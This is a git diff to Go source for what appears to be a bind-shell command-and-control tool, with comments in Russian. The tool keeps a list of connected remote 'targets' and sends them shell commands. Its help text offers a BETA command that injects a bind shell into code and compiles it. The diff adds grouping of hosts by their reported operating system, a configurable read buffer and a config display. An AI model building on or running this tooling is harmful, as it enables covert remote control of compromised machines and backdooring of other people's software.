@@ -17,24 +17,35 @@ type Target struct {
 	name   string
 	conn   net.Conn
 	status bool
+	group  string
 }
 
 var global_response_timeout int = 1000
+var global_buffer_size int = 4096
 var active_targets int = 0
 
 // Предоставляет список встроенных команд (вызов: /BS help).
 func BindShellHelp() {
 	fmt.Println("[BindShell] Command list:")
-	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
-	fmt.Println("\t- /BS help \t\t\tShow this list;")
-	fmt.Println("\t- /BS inject \t\t\tInject bind shell to code and compile it; (BETA)")
-	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
-	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host;")
-	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
-	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
-	fmt.Println("\t- /BS stop \t\t\tFinish session;")
+	fmt.Println("\n\t\tTargets:")
 	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
-	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> milliseconds;")
+	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
+	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
+	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
+	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host.")
+
+	fmt.Println("\n\t\tShell injecting:")
+	fmt.Println("\t- /BS inject \t\t\tInject bind shell to code and compile it. (BETA)")
+
+	fmt.Println("\n\t\tConfiguration:")
+	fmt.Println("\t- /BS config \t\t\tGet current configuration;")
+	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> millisecond(s);")
+	fmt.Println("\t- /BS buffer <size> \t\tSet buffer size to <size> byte(s).")
+
+	fmt.Println("\n\t\tOther:")
+	fmt.Println("\t- /BS help \t\t\tShow this list;")
+	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
+	fmt.Println("\t- /BS stop \t\t\tFinish session.")
 }
 
 // Завершает работу программы (вызов: /BS stop)
@@ -52,9 +63,9 @@ func BindShellTargets(targets *[]Target) {
 	fmt.Println("[BindShell] Current targets:")
 	for i := 0; i < len(*targets); i++ {
 		if (*targets)[i].status == true {
-			fmt.Printf("\t<%d> [+] %s\n", i, (*targets)[i].name)
+			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
 		} else {
-			fmt.Printf("\t<%d> [-] %s\n", i, (*targets)[i].name)
+			fmt.Printf("\t<%d> [-] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
 		}
 	}
 }
@@ -96,10 +107,23 @@ func BindShellOn(targets *[]Target, idx int) {
 	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
 }
 
-// Устанавливает значение переменной response_timeout равным value (вызов: /BS timeout)
+// Вывод сведений о текущей конфигурации
+func BindShellConfig() {
+	fmt.Println("[BindShell] Current configuration:")
+	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
+	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
+}
+
+// Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
 func BindShellTimeout(value int) {
 	global_response_timeout = value
 	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
+}
+
+// Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
+func BindShellBufferSize(value int) {
+	global_buffer_size = value
+	fmt.Printf("[BindShell] Buffer size set to %d byte(s).\n", global_buffer_size)
 }
 
 // Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
@@ -117,8 +141,17 @@ func addSession(targets *[]Target, target_name string) {
 		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
 	}
 
+	// Создание буфера для считывания ОС целевого хоста
+	init_buf := make([]byte, global_buffer_size)
+
+	// Чтение ОС хоста
+	n, err := conn.Read(init_buf)
+	if err != nil {
+		fmt.Println("[BindShell] Failed to read host OS!\n")
+	}
+
 	// Добавление хоста в список целей
-	*targets = append(*targets, Target{name: target_name, conn: conn, status: true})
+	*targets = append(*targets, Target{name: target_name, conn: conn, status: true, group: string(init_buf[:n])})
 
 	active_targets++
 }
@@ -148,7 +181,7 @@ func checkTargetNumber(targets *[]Target, input string) (bool, int) {
 	}
 }
 
-func checkTimeoutAndWaiting(input string) (bool, int) {
+func checkPositiveNumber(input string) (bool, int) {
 	value, err := strconv.Atoi(input)
 	if err != nil {
 		fmt.Println("[BindShell] The value is an invalid number!")
@@ -373,13 +406,20 @@ func BindShellRequest(request []string, targets *[]Target) {
 			return
 		}
 		BindShellAdd(targets, request[2])
+	case "buffer":
+		ok, value := checkPositiveNumber(request[2])
+		if ok {
+			BindShellBufferSize(value)
+		}
+	case "config":
+		BindShellConfig()
 	case "help":
 		BindShellHelp()
 	case "inject":
 		BindShellInject(request[2], request[3], request[4])
 	case "off":
 		// Если аргументов более трех, остановка
-		if len(request) > 3 {
+		if len(request) > 4 {
 			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"\n")
 			return
 		}
@@ -388,6 +428,16 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
 				BindShellOff(targets, i)
+			}
+			return
+		}
+
+		// Если указана конкретная группа хостов, присотановить всю группу
+		if len(request) == 4 && request[2] == "group" {
+			for i := 0; i < len(*targets); i++ {
+				if (*targets)[i].group == request[3] {
+					BindShellOff(targets, i)
+				}
 			}
 			return
 		}
@@ -401,7 +451,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		}
 	case "on":
 		// Если аргументов более трех, остановка
-		if len(request) > 3 {
+		if len(request) > 4 {
 			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"\n")
 			return
 		}
@@ -410,6 +460,16 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
 				BindShellOn(targets, i)
+			}
+			return
+		}
+
+		// Если указана конкретная группа хостов, возобновить всю группу
+		if len(request) == 4 && request[2] == "group" {
+			for i := 0; i < len(*targets); i++ {
+				if (*targets)[i].group == request[3] {
+					BindShellOn(targets, i)
+				}
 			}
 			return
 		}
@@ -437,6 +497,21 @@ func BindShellRequest(request []string, targets *[]Target) {
 			return
 		}
 
+		/*
+			// Если указана конкретная группа хостов, удалить всю группу
+			if len(request) == 4 && request[2] == "group" {
+				cnt := len(*targets)
+				for i := 0; i < cnt; {
+					if (*targets)[i].group == request[3] {
+						BindShellOff(targets, i)
+					} else {
+						i++
+					}
+				}
+				return
+			}
+		*/
+
 		// Иначе - проверка корректности идентификатора
 		ok, idx := checkTargetNumber(targets, request[2])
 
@@ -449,7 +524,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "targets":
 		BindShellTargets(targets)
 	case "timeout":
-		ok, value := checkTimeoutAndWaiting(request[2])
+		ok, value := checkPositiveNumber(request[2])
 		if ok {
 			BindShellTimeout(value)
 		}
@@ -470,7 +545,7 @@ func sendCommand(target Target, input string, ch_resp chan string) {
 	}
 
 	// Чтение ответа
-	buffer := make([]byte, 1024)
+	buffer := make([]byte, global_buffer_size)
 	n, err := target.conn.Read(buffer)
 	if err != nil {
 		ch_resp <- ""
